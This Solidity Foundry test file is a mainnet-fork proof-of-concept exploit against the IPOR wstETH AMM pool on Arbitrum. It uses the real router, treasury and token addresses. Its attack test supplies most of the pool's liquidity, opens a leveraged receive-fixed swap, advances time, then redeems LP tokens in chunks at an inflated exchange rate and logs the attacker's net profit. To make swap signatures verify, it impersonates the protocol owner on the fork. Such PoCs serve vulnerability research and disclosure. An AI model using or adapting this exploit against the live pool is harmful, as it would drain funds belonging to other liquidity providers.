// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// IPOR Derivatives — wstETH AMM pool on Arbitrum: fork PoC for the uncapped-SOAP exchange-rate bug.
//
// Run (see RUN.md):
//   cd ~/arc_hedgefun
//   cp <this file> test/IporWstEthFork.t.sol
//   ARB_RPC=https://arb1.arbitrum.io/rpc forge test --match-contract IporWstEthFork -vv
//
// Optional overrides: ATK_LP, TOTAL, LEV (all in wei, 18 dec), DAYS (default 45).
//
// NOTE ON THE SIGNATURE: opening a swap requires risk indicators signed by IPOR's off-chain signer.
// A fork cannot forge that signature, so this test impersonates the protocol owner once and points the
// message signer at a key we control (exactly like the owner could). The attacker's capital and the
// pool's accounting are untouched by that — every number below comes from real on-chain state.

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

struct RiskInputs {
    uint256 maxCollateralRatio;
    uint256 maxCollateralRatioPerLeg;
    uint256 maxLeveragePerLeg;
    int256 baseSpreadPerLeg;
    uint256 fixedRateCapPerLeg;
    uint256 demandSpreadFactor;
    uint256 expiration;
    bytes signature;
}

struct AmmBalances {
    uint256 totalCollateralPayFixed;
    uint256 totalCollateralReceiveFixed;
    uint256 liquidityPool;
    uint256 vault;
}

struct Swap {
    uint256 id;
    address buyer;
    uint256 openTimestamp;
    uint8 tenor;
    uint256 idsIndex;
    uint256 collateral;
    uint256 notional;
    uint256 ibtQuantity;
    uint256 fixedInterestRate;
    uint256 liquidationDepositAmount;
    uint8 state;
}

/// @dev everything is reached through the router proxy (it dispatches by msg.sig)
interface IIporRouter {
    function owner() external view returns (address);
    function setMessageSigner(address) external;

    function provideLiquidityWstEth(address beneficiary, uint256 wstEthAmount) external payable;
    function redeemFromAmmPoolWstEth(address beneficiary, uint256 ipTokenAmount) external;

    function openSwapReceiveFixed90daysWstEth(
        address beneficiary,
        address inputAsset,
        uint256 inputAssetTotalAmount,
        uint256 acceptableFixedInterestRate,
        uint256 leverage,
        RiskInputs calldata riskIndicatorsInputs
    ) external returns (uint256);

    function getAmmBalance(address asset) external view returns (AmmBalances memory);
    function getIpTokenExchangeRate(address asset) external view returns (uint256);
    function getSwap(uint8 direction, uint256 swapId) external view returns (Swap memory);
}

contract IporWstEthForkTest is Test {
    // ---- Arbitrum mainnet, official address book (IPOR-Labs/ipor-abi, mainnet-arbitrum/addresses.json)
    address constant ROUTER = 0x760Fa0aB719c4067D3A8d4727Cf07E8f3Bf118db; // IporProtocolRouterProxy
    address constant WSTETH = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address constant IPWSTETH = 0xbDa4b3e17a9B0ecb811E68c6f08907156CBa503C;
    address constant TREASURY = 0xBd013Ea2E01C2Ab3462dd67e9C83aa3834882A5D; // AmmTreasuryWstEthProxy
    address constant STORAGE = 0x326804339eC2a210e5f9246F4959aE50961c5C28; // AmmStorageWstEthProxy

    IIporRouter router;
    uint256 signerPk = 0xA11CE;
    address signer;
    address attacker = address(0xA77ACC);

    function setUp() public {
        router = IIporRouter(ROUTER);
        signer = vm.addr(signerPk);
        vm.createSelectFork(vm.envString("ARB_RPC"));
    }

    function _envOr(string memory k, uint256 def) internal view returns (uint256) {
        try vm.envUint(k) returns (uint256 v) {
            return v;
        } catch {
            return def;
        }
    }

    function _sign(RiskInputs memory in_, uint256 tenor, uint256 direction) internal view returns (bytes memory) {
        bytes32 digest = keccak256(
            abi.encodePacked(
                in_.maxCollateralRatio,
                in_.maxCollateralRatioPerLeg,
                in_.maxLeveragePerLeg,
                in_.baseSpreadPerLeg,
                in_.fixedRateCapPerLeg,
                in_.demandSpreadFactor,
                in_.expiration,
                WSTETH,
                tenor,
                direction
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    /// @notice read-only recon: depth, exchange rate, whether the pool is even alive on Arbitrum
    function test_00_recon() public view {
        AmmBalances memory b = router.getAmmBalance(WSTETH);
        console2.log("treasury wstETH          ", IERC20(WSTETH).balanceOf(TREASURY));
        console2.log("liquidityPool (accrued)  ", b.liquidityPool);
        console2.log("vault (asset management) ", b.vault);
        console2.log("totalCollateralPayFixed  ", b.totalCollateralPayFixed);
        console2.log("totCollateralReceiveFixed", b.totalCollateralReceiveFixed);
        console2.log("ipwstETH totalSupply     ", IERC20(IPWSTETH).totalSupply());
        console2.log("ipToken exchange rate    ", router.getIpTokenExchangeRate(WSTETH));
        console2.log("router owner (pause/multisig) ", router.owner());
    }

    /// @notice the attack: become the pool's biggest LP, open one self-harming receive-fixed swap,
    ///         wait, then redeem at a price backed by nothing.
    function test_01_attack() public {
        AmmBalances memory b0 = router.getAmmBalance(WSTETH);
        uint256 rate0 = router.getIpTokenExchangeRate(WSTETH);
        console2.log("== before ==");
        console2.log("exchangeRate", rate0);
        console2.log("liquidityPool", b0.liquidityPool);

        uint256 depth = b0.liquidityPool; // 18 dec for wstETH
        uint256 atkLp = _envOr("ATK_LP", depth); // default: match the existing pool -> ~50% share
        uint256 total = _envOr("TOTAL", (depth * 37) / 1000); // default: 3.7% of depth as collateral+fee
        uint256 lev = _envOr("LEV", 1000e18);
        uint256 daysToWait = _envOr("DAYS", 45);

        // 1. the owner-key trick, only to make the risk-indicator signature verifiable on a fork
        address owner = router.owner();
        vm.prank(owner);
        router.setMessageSigner(signer);

        // 2. attacker LP position
        deal(WSTETH, attacker, atkLp + total);
        vm.startPrank(attacker);
        IERC20(WSTETH).approve(ROUTER, type(uint256).max);
        router.provideLiquidityWstEth(attacker, atkLp);

        // 3. one leveraged receive-fixed swap, 90-day tenor
        RiskInputs memory ri = RiskInputs({
            maxCollateralRatio: 0.90e18,
            maxCollateralRatioPerLeg: 0.48e18,
            maxLeveragePerLeg: lev,
            baseSpreadPerLeg: 0.001e18,
            fixedRateCapPerLeg: 0.02e18,
            demandSpreadFactor: 280,
            expiration: block.timestamp + 1 hours,
            signature: ""
        });
        ri.signature = _sign(ri, 2, 1); // tenor DAYS_90 = 2, direction PAY_FLOATING_RECEIVE_FIXED = 1
        router.openSwapReceiveFixed90daysWstEth(attacker, WSTETH, total, 0, lev, ri);
        vm.stopPrank();

        Swap memory s = router.getSwap(1, 1);
        console2.log("== opened ==");
        console2.log("collateral", s.collateral);
        console2.log("notional  ", s.notional);
        console2.log("fixed rate", s.fixedInterestRate);

        // 4. time passes, nobody touches anything
        vm.warp(block.timestamp + daysToWait * 1 days);
        vm.roll(block.number + (daysToWait * 7200));

        uint256 rate1 = router.getIpTokenExchangeRate(WSTETH);
        console2.log("== after warp ==");
        console2.log("exchangeRate", rate1);
        console2.log("rate move (bps)", ((rate1 * 10_000) / rate0) - 10_000);

        // 5. redeem, in decreasing chunks until the guards stop us
        uint256 before = IERC20(WSTETH).balanceOf(attacker);
        uint256 left = IERC20(IPWSTETH).balanceOf(attacker);
        for (uint256 round = 0; round < 6 && left > 0; round++) {
            bool moved;
            uint256[6] memory pct = [uint256(100), 75, 50, 25, 10, 1];
            for (uint256 i = 0; i < 6; i++) {
                uint256 chunk = (left * pct[i]) / 100;
                if (chunk == 0) continue;
                vm.prank(attacker);
                (bool ok, ) = ROUTER.call(
                    abi.encodeWithSelector(IIporRouter.redeemFromAmmPoolWstEth.selector, attacker, chunk)
                );
                if (ok) {
                    left -= chunk;
                    moved = true;
                    break;
                }
            }
            if (!moved) break;
        }
        uint256 out = IERC20(WSTETH).balanceOf(attacker) - before;

        console2.log("== result ==");
        console2.log("attacker spend (LP + collateral)", atkLp + total);
        console2.log("attacker received back          ", out);
        console2.log("ipwstETH left unredeemed        ", left);
        if (out >= atkLp + total) {
            console2.log("NET PROFIT                      ", out - (atkLp + total));
        } else {
            console2.log("NET LOSS                        ", (atkLp + total) - out);
        }
        console2.log("treasury wstETH left            ", IERC20(WSTETH).balanceOf(TREASURY));
    }
}
